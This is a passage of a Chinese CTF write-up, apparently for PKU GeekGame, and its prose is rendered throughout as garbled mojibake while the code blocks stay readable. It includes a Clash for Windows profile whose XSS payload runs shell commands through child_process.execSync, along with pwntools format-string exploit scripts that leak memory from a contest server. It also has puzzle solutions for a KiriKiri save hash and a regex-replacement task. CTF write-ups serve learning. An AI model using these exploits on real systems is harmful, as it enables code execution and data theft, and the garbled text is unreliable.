æŠŠè¿™ä¸ªé…ç½®æ–‡ä»¶å‘å¸ƒåˆ°å…¬ç½‘ä¸Šï¼ˆæˆ‘è‡ªå·±æœ‰æœåŠ¡å™¨æ‰€ä»¥æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æœåŠ¡å™¨çš„è¯å¯ä»¥è¯•è¯•GitHub Pagesï¼‰ï¼Œç„¶åå¯¼å…¥è¿›å»å³å¯è·å¾—flag 2ã€‚

### Flag 1&Flag 3
è¿™ä¸¤ä¸ªflagå…¶å®æˆ‘æ˜¯ä¸€å—æ‹¿åˆ°çš„ï¼Œæç¤ºé‡Œé¢ç»™çš„[RESTful API](https://clash.gitbook.io/doc/restful-api)æˆ‘æ²¡æœ‰ç”¨åˆ°ã€‚

çŒœæµ‹è¿™ä¸¤ä¸ªflagéœ€è¦åˆ©ç”¨ä¸€äº›æ¼æ´ï¼Œäºæ˜¯è°·æ­Œâ€œClash æ¼æ´â€çœŸçš„å‘ç°äº†æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´åœ¨Clash for Windowsçš„0.19.9ç‰ˆæœ¬ä¿®å¤ï¼Œæ­£å¥½é¢˜ç›®æä¾›çš„æ˜¯0.19.8ç‰ˆæœ¬ï¼Œäºæ˜¯å½“ç„¶æƒ³åˆ°å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚å…·ä½“æ¼æ´æ˜¯ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆ[Issue](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)ï¼‰ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ç‰¹å®šä»£ç å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ¼æ´æ±‡æŠ¥æ—¶ç»™å‡ºçš„æ¡ˆä¾‹æ˜¯è°ƒç”¨Windowsçš„è®¡ç®—å™¨ã€‚ç”¨ç±»ä¼¼çš„æƒ³æ³•ï¼Œæ„å»ºä¸€ä¸ªæ–°çš„é…ç½®æ–‡ä»¶ï¼Œè¯»å–flag1æ‰€åœ¨çš„`/app/profiles/flag.yml`ï¼š

``` yaml
port: 7890
mode: Rule
log-level: info
external-controller: ":9090"
proxies:
  - name: a
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true

proxy-groups:
  - name: <img/src="1"/onerror="eval(`try{alert(require('child_process').execSync('/usr/bin/cat /app/profiles/flag.yml'));}catch(e){alert(e);}`);">
    type: select
    proxies:
    - a
```

å­˜åˆ°å…¬ç½‘ä¸Šåå¯¼å…¥è¿›å»ï¼Œç„¶åè·³åˆ°Profilesç•Œé¢ï¼Œå°±èƒ½çœ‹åˆ°`flag.yml`çš„å†…å®¹ï¼Œæ‹¿åˆ°flag 1ã€‚é¡ºå¸¦ä¸€æï¼ŒIssueæä¾›çš„å¤ç°é…ç½®æ–‡ä»¶é‡Œé¢`onerror`æ²¡åŠ å¼•å·ï¼Œå¯¼è‡´æˆ‘åœ¨è°ƒç”¨`/usr/bin/cat /app/profiles/flag.yml`çš„æ—¶å€™è€æ˜¯æ‹¿ä¸åˆ°ï¼Œå›°æ‰°äº†åŠå¤©ï¼Œæœ€åå‘ç°â€”â€”è‰ï¼Œæœ‰ç©ºæ ¼ï¼Œhtmlæ ‡ç­¾å±æ€§ä¸åŠ å¼•å·æ˜¯åæ–‡æ˜ï¼ˆç”šè‡³å†™é¢˜è§£çš„æ—¶å€™æˆ‘åˆå¿˜äº†åŠ å¼•å·ï¼‰ã€‚

åˆ©ç”¨åŒæ ·çš„åŠæ³•ï¼ŒæŠŠæ‰§è¡Œçš„ä»£ç ç”±`/usr/bin/cat /app/profiles/flag.yml`æ”¹æˆ`/app/readflag`å¯ä»¥æ‹¿åˆ°flag 3ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘å…¶å®æœ‰ç‚¹ä¸å¤ªæ˜ç™½çš„æ˜¯ï¼Œflag 3è®¾ç½®äº†æƒé™`500`ï¼Œè€Œä»£ç æ‰§è¡Œæ˜¯ç”¨nodeç”¨æˆ·è·‘çš„ï¼Œåº”è¯¥è¯»ä¸åˆ°flag 3æ‰å¯¹ï¼Œä¸è¿‡æ—¢ç„¶æ‹¿åˆ°äº†æˆ‘ä¹Ÿæ²¡å†ä»”ç»†ç ”ç©¶ã€‚

## æ±‰åŒ–ç»¿è‰²ç‰ˆå…è´¹ä¸‹è½½
### Flag 1ï¼šæ™®é€šä¸‹è½½
ä¸‹è½½ä¸‹æ¥è§£å‹ï¼Œçœ‹åˆ°`.xp3`ï¼Œæ˜¯Galgameå¸¸è§çš„æ‰“åŒ…ç±»å‹ï¼Œæ‰¾åˆ°ä¸€ä¸ªè§£åŒ…å·¥å…·[GARbro](https://github.com/morkt/GARbro)ï¼Œè§£åŒ…å³å¯æ‰¾åˆ°flag 1ã€‚

### Flag 2ï¼šé«˜é€Ÿä¸‹è½½
æ ¹æ®ä¸Šä¸€æ­¥è§£åŒ…å¯ä»¥æ‹¿åˆ°æºä»£ç ï¼š

``` plaintext

@jump storage="round2.ks" cond="f.text.charAt(f.text.length-1)=='}'"

å½“å‰æ–‡æœ¬ï¼š[emb exp="f.text"][r]

[link target=*sel_a clickse="SE_306"]> è¾“å…¥ A[endlink][r]
[link target=*sel_e clickse="SE_306"]> è¾“å…¥ E[endlink][r]
[link target=*sel_i clickse="SE_306"]> è¾“å…¥ I[endlink][r]
[link target=*sel_o clickse="SE_306"]> è¾“å…¥ O[endlink][r]
[link target=*sel_u clickse="SE_306"]> è¾“å…¥ U[endlink][r]
[link target=*sel_fin clickse="SE_306"]> è¾“å…¥ }[endlink][r]
[s]

*sel_a
@eval exp="f.text = f.text + 'A'"
@eval exp="f.hash = f.hash * 13337 + 11"
@jump target=*sel_end

*sel_e
@eval exp="f.text = f.text + 'E'"
@eval exp="f.hash = f.hash * 13337 + 22"
@jump target=*sel_end

*sel_i
@eval exp="f.text = f.text + 'I'"
@eval exp="f.hash = f.hash * 13337 + 33"
@jump target=*sel_end

*sel_o
@eval exp="f.text = f.text + 'O'"
@eval exp="f.hash = f.hash * 13337 + 44"
@jump target=*sel_end

*sel_u
@eval exp="f.text = f.text + 'U'"
@eval exp="f.hash = f.hash * 13337 + 55"
@jump target=*sel_end

*sel_fin
@eval exp="f.text = f.text + '}'"
@eval exp="f.hash = f.hash * 13337 + 66"
@jump target=*sel_end

*sel_end
@eval exp="f.hash = f.hash % 19260817"
```

å¯ä»¥çœ‹å‡ºæ¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå°±ä¼šè®¡ç®—hashï¼Œç„¶åæŠŠhashä¿å­˜åœ¨å­˜æ¡£ä¸­ã€‚å­˜æ¡£å¯ä»¥ç”¨[KirikiriDescrambler](https://github.com/arcusmaximus/KirikiriTools)è§£å‹ï¼š

``` plaintext
"user" => %[
"hash" => int 1337,
"text" => string "flag{",
"prev_hash" => int 7748521
],
```

ä¸è¿‡ä»…æœ‰hashè¿˜ä¸èƒ½ç¡®å®šè¾“å…¥çš„å†…å®¹ï¼Œè¿˜éœ€è¦è§£å‹`datasu.ksd`è¿™ä¸ªæ–‡ä»¶ï¼š


``` plaintext
%[
 "trail_round1_sel_i" => int 1,
 "autotrail_func_init" => int 1,
 "trail_func_init" => int 1,
 "autotrail_first_start" => int 1,
 "autotrail_round1_sel_i" => int 1,
 "trail_round1_round_1" => int 1,
 "trail_autolabel_autoLabelLabel" => int 18,
 "autotrail_round1_sel_end" => int 2,
 "trail_round1_sel_fin" => int 1,
 "autotrail_autolabel_autoLabelLabel" => int 2,
 "trail_round1_sel_a" => int 6,
 "autotrail_round1_sel_e" => int 1,
 "trail_first_start" => int 1,
 "trail_round1_sel_loop" => int 18,
 "autotrail_round1_sel_a" => int 1,
 "autotrail_round1_sel_o" => int 1,
 "trail_round1_sel_end" => int 17,
 "autotrail_round1_sel_loop" => int 1,
 "autotrail_round1_sel_fin" => int 1,
 "trail_round1_sel_e" => int 3,
 "autotrail_round2_round_2" => int 1,
 "trail_round1_sel_o" => int 6,
 "autotrail_round1_round_1" => int 2
]
```

`trail_round1_sel_i`ä»¥åŠåç¼€ä¸ºaã€eã€oçš„å˜é‡æ˜¯è¾“å…¥çš„æ¬¡æ•°ï¼Œæ ¹æ®è¯´æ˜â€œå‡ºé¢˜äººåªç©äº†ä¸€åŠâ€ï¼Œæ‰€ä»¥ä¸å¯èƒ½æ˜¯å¤šæ¬¡è¾“å…¥ï¼Œå› æ­¤å°±éœ€è¦è€ƒè™‘6ä¸ªAã€3ä¸ªEã€1ä¸ªIã€6ä¸ªOçš„å…¨æ’åˆ—ï¼Œå¹¶è®¡ç®—hashã€‚ä¸è¿‡è¿™ä¸ªè®¡ç®—é‡å¥½åƒæœ‰ç‚¹å¤§ï¼Œæˆ‘ç®—äº†å¥½ä¹…æ‰ç®—å‡ºæ¥ã€‚å†™ä¸€ä¸‹å…·ä½“è®¡ç®—æ–¹æ³•ï¼Œé¦–å…ˆå…ˆæ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œä¹Ÿå³å…¨æ’åˆ—ï¼š

``` python
def int2aeio(number: int, length: int = 16):
  s = ""
  while number > 0 or length > 0:
    number, digit = divmod(number, 4)
    s = "AEIO"[digit] + s
    length -= 1
  return s

writer = open("strings.txt", "w", -1, "utf8", None, "\n")

for i in range(0, 4 ** 16):
  s = int2aeio(i)
  if s.count("A") == 6 and s.count("E") == 3 and s.count("I") == 1 and s.count("O") == 6:
    writer.write(s + "\n")
    writer.flush()
```

ç„¶ååˆ†åˆ«è®¡ç®—æ¯ä¸ªå­—ç¬¦ä¸²çš„hashï¼š

``` python
def calc_hash(flag: str) -> int:
  hash = 1337
  for s in flag:
    hash = hash * 13337 + ("AEIO".index(s) + 1) * 11
  hash = hash * 13337 + 66
  hash = hash % 19260817
  return str(hash)

import multiprocess

if __name__ == "__main__":
  with multiprocess.Pool(16) as pool:
    with open("strings.txt", "r", -1, "utf8") as reader:
      result = pool.map(calc_hash, reader.read().split("\n"))
  
  with open("hash.txt", "w", -1, "utf8") as writer:
    writer.write("\n".join(result))
```

æœ€ååœ¨ç¬¬5888571è¡Œæ‰¾åˆ°äº†ç­”æ¡ˆã€‚

## åˆå­¦ C è¯­è¨€
### Flag 1
è¿™é¢˜æˆ‘æ˜¯åœ¨å†™é¢˜è§£çš„æ—¶å€™æ‰åšå‡ºæ¥çš„ï¼Œçœ‹æ¥å†™é¢˜è§£ç¡®å®æœ‰åŠ©äºæ•´ç†æ€è·¯ã€‚é¢˜ç›®ç»™äº†æºä»£ç ï¼Œä½†æˆ‘ä¸€ç›´æ²¡ææ‡‚é è¿™äº›ä¸œè¥¿æ€ä¹ˆèƒ½æŠŠflag 1ç»™è¾“å‡ºå‡ºæ¥ï¼Œæ ¹æ®æç¤ºæŸ¥äº†[èµ„æ–™](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/)æ‰çŸ¥é“ï¼ŒåŸæ¥`printf`è¿™ä¸ªå‡½æ•°è¿˜æœ‰åˆ«çš„ç”¨é€”ï¼ŒçœŸæ˜¯å¼€äº†çœ¼äº†ã€‚

æ ¹æ®èµ„æ–™çš„è¯´æ˜ï¼Œ`printf`å‡½æ•°ä¼šè¯»å–ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä»–å‚æ•°éƒ½æ˜¯å¯é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šçš„è¯å°±ä»æ ˆé‡Œé¢è¯»å–æ•°æ®ã€‚æºä»£ç é‡Œé¢çš„`printf`å‡½æ•°æœ‰è¿™ä¹ˆå‡ ä¸ªå‚æ•°ï¼š

``` c
int t = printf(buf, publics, publici);
```

`buf`å°±æ˜¯è¿™é‡Œçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰‹åŠ¨è¾“å…¥ï¼›`publics`å’Œ`publici`åˆ†åˆ«æ˜¯ä¸€ä¸ªç»™å®šçš„å­—ç¬¦ä¸²`"a_public_string"`å’Œä¸€ä¸ªç»™å®šçš„æ•´å‹å˜é‡`0xdeadbeef`ï¼›é‚£ä¹ˆä»ç¬¬ä¸‰ä¸ªå‚æ•°å¼€å§‹ï¼Œ`printf`è¾“å‡ºçš„å°±æ˜¯æ ˆé‡Œçš„ä¸œè¥¿äº†ã€‚

é¢˜ç›®è¯»å–çš„flag 1ä¿å­˜åœ¨äº†`flag1`è¿™ä¸ªå˜é‡ï¼Œä¸ºäº†è®©`printf`å‡½æ•°è¾“å‡ºå®ƒï¼Œéœ€è¦å…ˆçŸ¥é“å®ƒåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚æ‹¿IDAå¯ä»¥åæ±‡ç¼–æˆä¼ªä»£ç ï¼š

``` c
unsigned __int64 test()
{
  int v0; // r8d
  int v1; // r9d
  char v3; // [rsp+0h] [rbp-4F0h]
  __int64 v4; // [rsp+18h] [rbp-4D8h]
  char v5[16]; // [rsp+60h] [rbp-490h] BYREF
  __int64 v6; // [rsp+70h] [rbp-480h]
  __int64 v7; // [rsp+78h] [rbp-478h]
  __int64 v8; // [rsp+80h] [rbp-470h]
  __int64 v9; // [rsp+88h] [rbp-468h]
  __int64 v10; // [rsp+90h] [rbp-460h]
  __int64 v11; // [rsp+98h] [rbp-458h]
  __int64 v12[8]; // [rsp+A0h] [rbp-450h] BYREF
  char v13[1032]; // [rsp+E0h] [rbp-410h] BYREF
  unsigned __int64 v14; // [rsp+4E8h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  strcpy(v5, "a_public_string");
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12[0] = 0x67616C665F61LL;
  memset(&v12[1], 0, 56);
  v4 = fopen64("flag_f503be2d", &unk_9F008);
  fgets(v12, 63LL, v4);
  fclose(v4);
  while ( 1 )
  {
    puts("Please input your instruction:");
    fgets(v13, 1023LL, stdin);
    if ( !(unsigned int)memcmp(v13, "exit", 4LL) )
      break;
    if ( (int)printf((unsigned int)v13, (unsigned int)v5, -559038737, (unsigned int)v5, v0, v1, v3) > 1024 )
    {
      puts("Too long!");
      return __readfsqword(0x28u) ^ v14;
    }
    putchar(10LL);
  }
  return __readfsqword(0x28u) ^ v14;
}
```

æ˜¾ç„¶è¿™é‡Œçš„`v13`å°±æ˜¯`buf`ï¼Œ`v12`å°±æ˜¯`flag1`ï¼Œ`v5`å°±æ˜¯`publics`ï¼Œæ ¹æ®ä¼ªä»£ç ä¸­ç»™å‡ºçš„åœ°å€ï¼Œ`flag1`ç›¸å¯¹`publics`çš„å†…å­˜åœ°å€åŠ äº†`0x40`ï¼Œè€Œ`publics`çš„å†…å­˜åœ°å€å¯ä»¥é€šè¿‡`%p`æ¥å¾—åˆ°ï¼Œè¿™æ ·å°±èƒ½å¤Ÿæƒ³åŠæ³•æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè®©`printf`è¾“å‡º`flag1`äº†ã€‚

åˆ°ç›®å‰ä¸ºæ­¢è¿˜ç®—ç®€å•ï¼Œæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æˆ‘å°±æ‡µåœˆäº†ã€‚çœ‹äº†å¾ˆå¤šç½‘ä¸Šçš„èµ„æ–™ï¼ŒCTF Wikiå†™çš„æ˜¯é€šè¿‡`addr%k$s`æ¥æ„é€ ï¼Œæˆ‘ä¸€å¼€å§‹æ—¢æ²¡æ˜ç™½`addr`æ˜¯ä»€ä¹ˆï¼Œä¹Ÿæ²¡æ˜ç™½`%k`æ˜¯å¤šå°‘ï¼Œåœ¨è¿™é‡Œå¡ä½äº†ã€‚ç›´åˆ°æˆ‘å†™é¢˜è§£çš„æ—¶å€™é‡æ–°æœç´¢äº†ä¸€ä¸‹ï¼Œå‘ç°äº†[è¿™ç¯‡æ–‡ç« ](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html)ï¼Œæ‰ææ˜ç™½æ˜¯æ€ä¹ˆå›äº‹ã€‚

åœ¨è¾“å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²`buf`çš„æ—¶å€™ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å®é™…ä¸Šä¹Ÿä¿å­˜åœ¨æ ˆé‡Œï¼Œèƒ½å¤Ÿé€šè¿‡`%(n)$p`æ¥è·å–ï¼Œå…¶ä¸­â€œ(n)â€æ›¿æ¢æˆæ•°å­—ï¼Œä¾‹å¦‚`%1$p`æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä»¥`%p`ï¼ˆæŒ‡é’ˆåœ°å€ï¼‰çš„æ ¼å¼è¾“å‡ºã€‚é‚£ä¹ˆè¯¥å¦‚ä½•ç¡®å®š`buf`çš„â€œ(n)â€å‘¢ï¼Ÿ[è¿™ç¯‡æ–‡ç« ](https://xz.aliyun.com/t/7398)é‡Œæœ‰ä¸€å¥è¯ï¼š

> å› ä¸º64ä½çš„å‚æ•°å­˜æ”¾æ˜¯ä¼˜å…ˆå¯„å­˜å™¨(rdi,rsi,rdx,rcx,r8,r9)ï¼Œå æ»¡ä»¥åç¬¬7ä¸ªå‚æ•°æ‰ä¼šå­˜æ”¾åœ¨æ ˆä¸Šã€‚è¿™å°±æ˜¯è·Ÿ32ä½æ‰¾åç§»ä¸åŒåœ°æ–¹ã€‚

è¿™å¥è¯æˆ‘ä¸€ç›´æ²¡ææ˜ç™½ï¼Œç›´åˆ°å†™é¢˜è§£çš„æ—¶å€™æ‰ææ¸…æ¥šã€‚[è¿™ç¯‡æ–‡ç« ](https://blog.csdn.net/m0_49959202/article/details/119860494)é‡Œæœ‰ä¸ªå›¾ï¼Œæ–¹ä¾¿ç†è§£ã€‚å…¶å®ä¸Šé¢åæ±‡ç¼–çš„ä»£ç å·²ç»å†™å¾—å¾ˆæ˜ç™½äº†ï¼Œ`buf`çš„åœ°å€æ˜¯`[rsp+E0h]`ï¼Œè€Œ64ä½ç¨‹åºæ¯ä¸ªå¯„å­˜å™¨æ˜¯8ä¸ªå­—èŠ‚ï¼Œå› æ­¤å®ƒç›¸å½“äºæ˜¯ç¬¬`224 / 8 + 6 = 34`ï¼ˆ224å°±æ˜¯0xE0ï¼Œ6æ˜¯å‰6ä¸ªâ€œä¼˜å…ˆå¯„å­˜å™¨â€ï¼‰ä¸ªå¯„å­˜å™¨ï¼Œç”¨`%34$p`å°±å¯ä»¥è·å–åˆ°`buf`ä¿å­˜çš„æ•°æ®äº†ã€‚ä¸è¿‡æˆ‘åšå‡ºæ¥çš„æ—¶å€™æ²¡ç®—è¿™äº›ï¼Œè€Œæ˜¯ä»¿ç…§[è¿™ç¯‡æ–‡ç« ](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html)çš„åšæ³•ï¼Œè¾“å…¥`AAAAAAAA%18$p %19$p ... %63$p`ï¼ŒæŠŠ`buf`çš„ç›¸å¯¹ä½ç½®è¯•å‡ºæ¥çš„ã€‚

æ‰¾åˆ°äº†åœ°å€ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦â€œå†™å…¥â€ã€‚é€šè¿‡åœ¨ç¬¬ä¸€æ­¥ä¼ å‚`%p`å¯ä»¥ç›´æ¥è·å¾—`publics`çš„ç»å¯¹åœ°å€ï¼Œç„¶ååŠ `0x40`å¾—åˆ°`flag1`çš„ç»å¯¹åœ°å€ã€‚è¦æƒ³è¾“å‡º`flag1`çš„å­—ç¬¦ä¸²ï¼Œéœ€è¦æŠŠ`flag1`çš„ç»å¯¹åœ°å€ä¼ ç»™`printf`å‡½æ•°ã€‚å‰é¢æåˆ°çš„æ„é€ æ ¼å¼æ˜¯`addr%k$s`ï¼Œå®é™…ä¸Šè¿™é‡Œçš„`%k`å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„â€œå¯„å­˜å™¨ç¼–å·â€ï¼Œ`addr`åˆ™æ˜¯ä»¥å°ç«¯åºä¿å­˜çš„å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„ç»å¯¹åœ°å€ã€‚åœ¨è¾“å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åï¼Œå…¶å†…å®¹ä¼šæŒ‰ç…§å­—èŠ‚åºåˆ—ä¿å­˜åˆ°`%k`çš„ä½ç½®ã€‚åŒæ—¶ï¼Œå­—ç¬¦ä¸²ä¸­åŒ…å«äº†`%k$s`ï¼Œ`%s`æ˜¯å­—ç¬¦ä¸²æ ¼å¼ï¼Œä¼ çš„å‚æ•°å®é™…ä¸Šæ˜¯å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå› æ­¤å¯ä»¥è®©`printf`å‡½æ•°è¯»åˆ°æ„é€ çš„`addr`æ‰€åœ¨çš„å†…å®¹ï¼Œä»è€Œè¾“å‡º`flag1`ã€‚è€Œä¸”è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼Œ64ä½ç¨‹åºå†…å­˜åœ°å€åªç”¨äº†6ä¸ªå­—èŠ‚ï¼Œæœ€é«˜çš„ä¸¤ä¸ªå­—èŠ‚æ˜¯`00 00`ï¼Œå¦‚æœæŠŠå†…å­˜åœ°å€æ”¾åœ¨å‰é¢å°±ä¼šè¢«å½“æˆæ˜¯å­—ç¬¦ä¸²çš„ç»“æŸï¼Œå› æ­¤éœ€è¦æŠŠ`addr`æ”¾åœ¨åé¢ï¼Œå¹¶ä¸”å¯¹é½åˆ°8ä¸ªå­—èŠ‚ï¼Œè¿™æ ·æ‰èƒ½æ­£ç¡®è¾“å‡ºã€‚æœ€ç»ˆæ„é€ å‡ºæ¥çš„ç¨‹åºæ˜¯è¿™æ ·ï¼š

``` python
from pwn import *

conn = connect("prob09.geekgame.pku.edu.cn", "10009")
conn.recvuntil(b"Please input your token: ")
conn.send(b"MY TOKEN\n")
conn.recvuntil(b"Please input your instruction:\n")
conn.sendline(b"%1$p")
line = conn.recvline().decode("utf8", "ignore")
addr = int(line[2:], 16) + 0x40
conn.recvuntil(b"Please input your instruction:\n")
conn.sendline(b"%35$s".ljust(0x08, b"a") + p64(addr))
line = conn.recvline().decode("utf8", "ignore")
print(line)
conn.close()
```

ç°åœ¨å¤ç›˜ä¸€ä¸‹ï¼Œå› ä¸ºå·²ç»çŸ¥é“`flag1`çš„åœ°å€æ˜¯`[rsp+A0h]`ï¼ŒæŒ‰åˆšæ‰çš„ç®—æ³•æ˜¯ç¬¬26ä¸ªå¯„å­˜å™¨ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å‡ºç»“æœï¼š

``` python
from pwn import *
import struct

conn = connect("prob09.geekgame.pku.edu.cn", "10009")
conn.recvuntil(b"Please input your token: ")
conn.send(b"MY TOKEN\n")
conn.recvuntil(b"Please input your instruction:\n")
conn.sendline(b"%26$p %27$p %28$p %29$p %30$p %31$p %32$p %33$p")
line = conn.recvline().decode("utf8", "ignore").strip("\n")
line_bytes = struct.pack("<8Q", *[int(x[2:], 16) if x != "(nil)" else 0 for x in line.split(" ")])
print(line_bytes.decode("utf8", "ignore"))
conn.close()
```

## å…³é”®è¯è¿‡æ»¤å–µï¼Œè°¢è°¢å–µ
### Flag 1ï¼šå­—æ•°ç»Ÿè®¡å–µ
äºŒè¿›åˆ¶é¢˜å’Œç®—æ³•é¢˜æˆ‘éƒ½æœ‰ç‚¹ä¸å¤ªä¼šåšï¼Œæ‰€ä»¥å°±ç›´æ¥è·³åˆ°è¿™é¢˜äº†å–µã€‚é¢˜ç›®è¦æ±‚å¤„ç†åè¾“å‡º10è¿›åˆ¶çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œæˆ‘æƒ³äº†å¾ˆä¹…ä¹‹åå¾—å‡ºäº†è¿™ä¹ˆä¸€ä¸ªæ€è·¯å–µï¼š

1. å¦‚æœæ˜¯ç©ºç™½æ–‡ä»¶ï¼Œç›´æ¥æ›¿æ¢æˆ0ç»“æŸå–µï¼›
2. ä¸æ˜¯ç©ºç™½æ–‡ä»¶ï¼ŒæŠŠæ‰€æœ‰çš„å­—ç¬¦æ›¿æ¢æˆåŒä¸€ä¸ªå­—ç¬¦`-`å–µï¼›ä½†æ˜¯ç”±äºå¤„ç†ç¨‹åºå†™çš„æ˜¯`while inst.regex.search(s):`ï¼Œå¦‚æœè¾“å‡ºåçš„å­—ç¬¦è¿˜èƒ½æ›¿æ¢ä¼šè¢«å¡æ­»ï¼Œæ‰€ä»¥å…ˆæŠŠ`-`æ›¿æ¢æˆ`+`ï¼Œå†æŠŠæ‰€æœ‰å­—ç¬¦æ›¿æ¢æˆ`-`å–µï¼›
3. æŒ‰åä¸‡ä½ã€ä¸‡ä½ã€åƒä½ã€ç™¾ä½ã€åä½ã€ä¸ªä½ä¾æ¬¡æ›¿æ¢æˆ`G`-`A`ï¼Œå¦‚æœæœ‰æŸä½ç©ºç¼ºï¼Œå°±æ›¿æ¢æˆ` 0`å–µï¼›
4. æœ€åæŒ‰ç…§å­—æ¯ä¸ªæ•°æ›¿æ¢æˆ9-1ï¼Œå†æŠŠç©ºæ ¼åˆ é™¤ï¼Œå°±å¾—åˆ°äº†æœ€ç»ˆç»“æœå–µã€‚

è¿˜å¥½æ‰€æœ‰çš„è¾“å…¥æ•°æ®éƒ½åœ¨ç™¾ä¸‡ä¸ªå­—ç¬¦ä»¥å†…ï¼Œå¦åˆ™çš„è¯è¿˜å¾—ç»§ç»­å¾€ä¸Šå†™å–µï¼

æœ€ç»ˆçš„ç»“æœæ˜¯è¿™æ ·çš„å–µï¼š

``` plaintext
å¦‚æœçœ‹åˆ°ã€(.|\n)ã€‘å°±è·³è½¬åˆ°ã€å¼€å§‹æ›¿æ¢ã€‘å–µ
æŠŠã€^ã€‘æ›¿æ¢æˆã€0ã€‘å–µ
å¦‚æœçœ‹åˆ°ã€0ã€‘å°±è·³è½¬åˆ°ã€è°¢è°¢å–µã€‘å–µ
å¼€å§‹æ›¿æ¢ï¼š
é‡å¤æŠŠã€-ã€‘æ›¿æ¢æˆã€+ã€‘å–µ
é‡å¤æŠŠã€[^\-]ã€‘æ›¿æ¢æˆã€-ã€‘å–µ
é‡å¤æŠŠã€-{1000000}ã€‘æ›¿æ¢æˆã€Gã€‘å–µ
å¦‚æœçœ‹åˆ°ã€-{100000}ã€‘å°±è·³è½¬åˆ°ã€Fã€‘å–µ
æŠŠã€^([G0]+)ã€‘æ›¿æ¢æˆã€\1 0ã€‘å–µ
Fï¼š
é‡å¤æŠŠã€-{100000}ã€‘æ›¿æ¢æˆã€Fã€‘å–µ
å¦‚æœçœ‹åˆ°ã€-{10000}ã€‘å°±è·³è½¬åˆ°ã€Eã€‘å–µ
æŠŠã€^([FG0]+)ã€‘æ›¿æ¢æˆã€\1 0ã€‘å–µ
Eï¼š
é‡å¤æŠŠã€-{10000}ã€‘æ›¿æ¢æˆã€Eã€‘å–µ
å¦‚æœçœ‹åˆ°ã€-{1000}ã€‘å°±è·³è½¬åˆ°ã€Dã€‘å–µ
æŠŠã€^([E-G0]+)ã€‘æ›¿æ¢æˆã€\1 0ã€‘å–µ
Dï¼š
é‡å¤æŠŠã€-{1000}ã€‘æ›¿æ¢æˆã€Dã€‘å–µ
å¦‚æœçœ‹åˆ°ã€-{100}ã€‘å°±è·³è½¬åˆ°ã€Cã€‘å–µ
æŠŠã€^([D-G0]+)ã€‘æ›¿æ¢æˆã€\1 0ã€‘å–µ
Cï¼š
é‡å¤æŠŠã€-{100}ã€‘æ›¿æ¢æˆã€Cã€‘å–µ
å¦‚æœçœ‹åˆ°ã€-{10}ã€‘å°±è·³è½¬åˆ°ã€Bã€‘å–µ
æŠŠã€^([C-G0]+)ã€‘æ›¿æ¢æˆã€\1 0ã€‘å–µ
Bï¼š
é‡å¤æŠŠã€-{10}ã€‘æ›¿æ¢æˆã€Bã€‘å–µ
å¦‚æœçœ‹åˆ°ã€-ã€‘å°±è·³è½¬åˆ°ã€Aã€‘å–µ
æŠŠã€^([B-G0]+)ã€‘æ›¿æ¢æˆã€\1 0ã€‘å–µ
Aï¼š
é‡å¤æŠŠã€-ã€‘æ›¿æ¢æˆã€Aã€‘å–µ
é‡å¤æŠŠã€([A-Z])0\1ã€‘æ›¿æ¢æˆã€\1\1ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{8}ã€‘æ›¿æ¢æˆã€9ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{7}ã€‘æ›¿æ¢æˆã€8ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{6}ã€‘æ›¿æ¢æˆã€7ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{5}ã€‘æ›¿æ¢æˆã€6ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{4}ã€‘æ›¿æ¢æˆã€5ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{3}ã€‘æ›¿æ¢æˆã€4ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1{2}ã€‘æ›¿æ¢æˆã€3ã€‘å–µ
é‡å¤æŠŠã€([A-Z])\1ã€‘æ›¿æ¢æˆã€2ã€‘å–µ
é‡å¤æŠŠã€[A-Z]ã€‘æ›¿æ¢æˆã€1ã€‘å–µ
é‡å¤æŠŠã€ ã€‘æ›¿æ¢æˆã€ã€‘å–µ
è°¢è°¢å–µï¼š
è°¢è°¢å–µ
```

## å°ç« é±¼çš„æ›²å¥‡
### Flag 1ï¼šSmol Cookie
